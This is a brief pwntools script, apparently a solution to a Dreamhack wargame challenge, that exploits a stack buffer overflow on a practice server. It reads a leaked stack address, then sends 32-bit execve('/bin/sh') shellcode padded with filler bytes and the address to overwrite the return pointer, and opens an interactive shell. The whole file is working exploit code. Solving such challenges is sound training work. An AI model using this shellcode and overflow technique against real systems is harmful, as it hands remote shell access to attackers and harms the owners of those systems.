from pwn import *

r=remote("host1.dreamhack.games",14551)
print("remote success")
re=r.recvuntil("(")
print(re)
re=int(r.recv(10),16)
print(re)
pe=p32(re)
print(pe)


payload="\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31"+"\xd2\xb0\x08\x40\x40\x40\xcd\x80"+"A"*106+pe

r.send(payload)
r.interactive()

